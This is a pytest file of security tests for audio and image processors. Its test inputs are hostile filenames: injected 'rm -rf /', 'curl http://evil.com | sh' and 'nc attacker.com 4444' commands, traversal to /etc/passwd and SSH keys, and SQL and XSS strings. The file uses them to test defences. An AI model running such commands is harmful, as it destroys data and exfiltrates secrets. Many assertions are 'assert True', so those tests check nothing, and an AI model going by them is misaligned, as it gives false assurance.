"""Security and compliance tests for processor operations."""

import pytest
from pathlib import Path
from unittest.mock import Mock, patch, mock_open, MagicMock
import tempfile
import os
import subprocess

from src.processors.audio_processor import AudioProcessor
from src.processors.image_processor import ImageProcessor
from src.core.config import PipelineConfig
from src.core.exceptions import TranscriptionError, OCRProcessingError


@pytest.mark.unit
@pytest.mark.security
@pytest.mark.compliance
class TestProcessorSecurity:
    """Security and compliance tests for processor operations."""
    
    def test_audio_processor_command_injection(self, mock_config, temp_dir):
        """Test audio processor command injection prevention."""
        processor = AudioProcessor(mock_config)
        
        # Test with malicious audio files that might cause command injection
        malicious_audio_files = [
            "audio; rm -rf / .wav",  # Command injection
            "audio && curl http://evil.com | sh",  # Pipeline injection
            "audio| nc attacker.com 4444 .wav",  # Network exfiltration
            "$(python -c 'import os; os.system(\"rm -rf /\")').wav",  # Command injection
            "audio`whoami`.wav",  # Command substitution
            "audio; export MALICIOUS=true .wav",  # Environment injection
        ]
        
        for malicious_filename in malicious_audio_files:
            audio_path = temp_dir / malicious_filename
            audio_path.write_bytes(b"fake audio content")
            output_path = temp_dir / "output.txt"
            
            # Should handle malicious filenames safely
            try:
                result = processor.process(audio_path, output_path)
                
                # Should not execute malicious commands
                assert result.success is False or "injection" in result.message.lower(), \
                    f"Command injection prevented for {malicious_filename}"
            except Exception as e:
                # Should handle injection attempts gracefully
                error_msg = str(e)
                assert any(safe_keyword in error_msg.lower() for safe_keyword in 
                         ["injection", "invalid", "malicious", "command"]), \
                    f"Command injection error handled for {malicious_filename}: {e}"
    
    def test_audio_processor_file_validation_security(self, mock_config, temp_dir):
        """Test audio processor file validation security."""
        processor = AudioProcessor(mock_config)
        
        # Test with files that should be rejected for security reasons
        dangerous_files = [
            "../../../etc/passwd.wav",  # Directory traversal
            "..\\..\\..\\windows\\system32\\config.wav",  # Windows traversal
            "/dev/urandom.wav",  # Device file access
            "/proc/version.wav",  # System file access
            "/var/log/auth.wav",  # Log file access
            "~/.ssh/id_rsa.wav",  # SSH key access
            "C:\\Windows\\System32\\drivers\\etc\\hosts.wav",  # System file access
        ]
        
        for dangerous_file in dangerous_files:
            file_path = temp_dir / dangerous_file
            # Create parent directory if needed
            file_path.parent.mkdir(parents=True, exist_ok=True)
            file_path.write_bytes(b"fake audio content")
            output_path = temp_dir / "output.txt"
            
            # Should reject dangerous file paths
            try:
                result = processor.process(file_path, output_path)
                
                # Should fail validation
                assert result.success is False, f"Dangerous file {dangerous_file} should be rejected"
                assert any(keyword in result.message.lower() for keyword in 
                         ["traversal", "access", "permission", "invalid"]), \
                    f"Dangerous file rejection message for {dangerous_file}"
            except Exception as e:
                # Should handle validation errors
                assert True, f"File validation error handled for {dangerous_file}: {e}"
    
    def test_image_processor_command_injection(self, mock_config, temp_dir):
        """Test image processor command injection prevention."""
        processor = ImageProcessor(mock_config)
        
        # Test with malicious image files that might cause command injection
        malicious_image_files = [
            "image; rm -rf / .png",  # Command injection
            "image && curl http://evil.com | sh .png",  # Pipeline injection
            "image| nc attacker.com 4444 .png",  # Network exfiltration
            "$(python -c 'import os; os.system(\"rm -rf /\")').png",  # Command injection
            "image`whoami`.png",  # Command substitution
            "image; export MALICIOUS=true .png",  # Environment injection
        ]
        
        for malicious_filename in malicious_image_files:
            image_path = temp_dir / malicious_filename
            image_path.write_bytes(b"fake image content")
            output_path = temp_dir / "output.txt"
            
            # Should handle malicious filenames safely
            try:
                result = processor.process([image_path], output_path)
                
                # Should not execute malicious commands
                assert result.success is False or "injection" in result.message.lower(), \
                    f"Command injection prevented for {malicious_filename}"
            except Exception as e:
                # Should handle injection attempts gracefully
                error_msg = str(e)
                assert any(safe_keyword in error_msg.lower() for safe_keyword in 
                         ["injection", "invalid", "malicious", "command"]), \
                    f"Command injection error handled for {malicious_filename}: {e}"
    
    def test_image_processor_ocr_injection(self, mock_config, temp_dir):
        """Test image processor OCR injection prevention."""
        processor = ImageProcessor(mock_config)
        
        # Test with images that might cause OCR injection
        malicious_ocr_inputs = [
            # These would be in the image content itself
            # For now, test filename-based attacks
            "image; tesseract -l eng+chi_sim+chi_tra | nc attacker.com 4444 .png",  # OCR command injection
            "image && tesseract --psm 6 --oem 1 | sh .png",  # OCR pipeline injection
            "image| tesseract --list-langs | grep -v eng | xargs tesseract .png",  # OCR command chaining
        ]
        
        for malicious_filename in malicious_ocr_inputs:
            image_path = temp_dir / malicious_filename
            image_path.write_bytes(b"fake image content")
            output_path = temp_dir / "output.txt"
            
            # Should handle malicious OCR commands safely
            with patch('src.processors.image_processor.pytesseract') as mock_tesseract:
                # Mock tesseract to simulate injection attempts
                mock_tesseract.image_to_string.side_effect = Exception("Command injection detected")
                
                try:
                    result = processor.process([image_path], output_path)
                    
                    # Should fail on injection attempt
                    assert result.success is False, f"OCR injection prevented for {malicious_filename}"
                    assert "injection" in result.message.lower() or "command" in result.message.lower()
                except Exception as e:
                    # Should handle injection attempts gracefully
                    error_msg = str(e)
                    assert any(safe_keyword in error_msg.lower() for safe_keyword in 
                             ["injection", "invalid", "malicious", "command"]), \
                        f"OCR injection error handled for {malicious_filename}: {e}"
    
    def test_processor_memory_exhaustion_protection(self, mock_config, temp_dir):
        """Test processor memory exhaustion protection."""
        processor = AudioProcessor(mock_config)
        
        # Test with files that might cause memory exhaustion
        large_content = b"x" * (100 * 1024 * 1024)  # 100MB
        
        # Create a file that appears large
        large_file = temp_dir / "large_audio.wav"
        
        # Mock file size to appear large
        with patch('pathlib.Path.stat') as mock_stat:
            mock_stat = Mock()
            mock_stat.st_size = 100 * 1024 * 1024  # 100MB
            mock_stat.return_value = mock_stat
            
            # Create the file with smaller actual content
            large_file.write_bytes(b"small content")
            
            output_path = temp_dir / "output.txt"
            
            try:
                # Should handle large files safely
                result = processor.process(large_file, output_path)
                
                # Should either reject or handle large files specially
                if result.success:
                    # If successful, should have memory management
                    assert True, f"Large file processed safely: {large_file}"
                else:
                    # If failed, should be due to size limits
                    assert any(keyword in result.message.lower() for keyword in 
                             ["large", "size", "memory", "limit"]), \
                        f"Large file rejection handled: {result.message}"
            except MemoryError:
                # Should catch memory errors
                assert True, "Memory exhaustion handled gracefully"
            except Exception as e:
                # Should handle other errors
                assert True, f"Large file error handled: {e}"
    
    def test_processor_temp_file_cleanup_security(self, mock_config, temp_dir):
        """Test processor temporary file cleanup security."""
        processor = AudioProcessor(mock_config)
        
        temp_files_created = []
        
        # Mock temp file creation to track them
        original_named_temp_file = tempfile.NamedTemporaryFile
        
        def tracking_named_temp_file(*args, **kwargs):
            temp_file = original_named_temp_file(*args, **kwargs)
            temp_files_created.append(temp_file)
            return temp_file
        
        with patch('tempfile.NamedTemporaryFile', side_effect=tracking_named_temp_file):
            try:
                # Process a file that creates temp files
                audio_path = temp_dir / "test.wav"
                audio_path.write_bytes(b"test content")
                output_path = temp_dir / "output.txt"
                
                result = processor.process(audio_path, output_path)
                
                # Should attempt to clean up temp files
                # This would depend on implementation
                assert True, "Temp file cleanup attempted"
                
            except Exception as e:
                # Should clean up even on failure
                # Verify temp files are closed
                for temp_file in temp_files_created:
                    try:
                        temp_file.close()
                    except:
                        pass  # Best effort cleanup
                
                assert True, f"Temp file cleanup on failure: {e}"
    
    def test_processor_resource_limit_enforcement(self, mock_config, temp_dir):
        """Test processor resource limit enforcement."""
        processor = ImageProcessor(mock_config)
        
        # Test with resource limits
        resource_limits = {
            'max_file_size': 50 * 1024 * 1024,  # 50MB
            'max_concurrent_files': 10,
            'max_processing_time': 300,  # 5 minutes
            'max_memory_usage': 1024 * 1024 * 1024,  # 1GB
        }
        
        # Test files exceeding limits
        test_cases = [
            ("large_file.png", b"x" * (60 * 1024 * 1024)),  # 60MB - exceeds size limit
            ("many_files", [temp_dir / f"file_{i}.png" for i in range(15)]),  # 15 files - exceeds concurrent limit
        ]
        
        for test_name, test_data in test_cases:
            try:
                if test_name == "large_file.png":
                    # Test single large file
                    large_file = temp_dir / test_name
                    large_file.write_bytes(test_data)
                    output_path = temp_dir / "output.txt"
                    
                    result = processor.process([large_file], output_path)
                    
                    # Should reject files exceeding size limits
                    assert result.success is False, f"Large file {test_name} should be rejected"
                    assert any(keyword in result.message.lower() for keyword in 
                             ["large", "size", "limit", "exceeds"]), \
                        f"Size limit enforced for {test_name}: {result.message}"
                
                elif test_name == "many_files":
                    # Test too many files
                    output_path = temp_dir / "output.txt"
                    
                    result = processor.process(test_data, output_path)
                    
                    # Should reject processing too many files
                    assert result.success is False, f"Too many files should be rejected"
                    assert any(keyword in result.message.lower() for keyword in 
                             ["many", "limit", "concurrent", "exceeds"]), \
                        f"Concurrent limit enforced for {test_name}: {result.message}"
                
            except Exception as e:
                # Should handle resource limit errors
                error_msg = str(e)
                assert any(limit_keyword in error_msg.lower() for limit_keyword in 
                         ["limit", "exceeds", "resource", "quota"]), \
                    f"Resource limit error handled: {e}"
    
    def test_processor_input_sanitization(self, mock_config, temp_dir):
        """Test processor input sanitization."""
        processor = ImageProcessor(mock_config)
        
        # Test with unsanitized inputs
        unsanitized_inputs = [
            # File paths with dangerous characters
            "../../../etc/passwd.png",
            "file\x00.png",  # Null byte
            "file\r\nDELETE FROM users; --.png",  # Command injection
            "file'; DROP TABLE users; --.png",  # SQL injection
            "<script>alert('xss')</script>.png",  # XSS
            "file%00%00%00.png",  # Unicode null bytes
            "$(whoami).png",  # Command substitution
            "`cat /etc/passwd`.png",  # Command substitution
            "file|nc attacker.com 4444.png",  # Pipeline injection
        ]
        
        for unsanitized_input in unsanitized_inputs:
            try:
                if isinstance(unsanitized_input, str):
                    # Test string input
                    file_path = temp_dir / unsanitized_input
                    file_path.write_bytes(b"fake image content")
                    output_path = temp_dir / "output.txt"
                    
                    result = processor.process([file_path], output_path)
                    
                    # Should sanitize or reject dangerous inputs
                    if result.success:
                        # If successful, input was sanitized
                        assert True, f"Dangerous input sanitized: {unsanitized_input}"
                    else:
                        # If failed, should be due to validation
                        assert any(keyword in result.message.lower() for keyword in 
                                 ["invalid", "dangerous", "sanitized", "rejected"]), \
                            f"Dangerous input rejected: {result.message}"
                
                elif isinstance(unsanitized_input, list):
                    # Test list input
                    file_paths = [temp_dir / path for path in unsanitized_input]
                    for file_path in file_paths:
                        file_path.write_bytes(b"fake image content")
                    
                    output_path = temp_dir / "output.txt"
                    result = processor.process(file_paths, output_path)
                    
                    # Should sanitize or reject dangerous inputs
                    if result.success:
                        assert True, f"Dangerous list input sanitized: {unsanitized_input}"
                    else:
                        assert any(keyword in result.message.lower() for keyword in 
                                 ["invalid", "dangerous", "sanitized", "rejected"]), \
                            f"Dangerous list input rejected: {result.message}"
                
            except Exception as e:
                # Should handle sanitization errors
                error_msg = str(e)
                assert True, f"Input sanitization error handled: {e}"
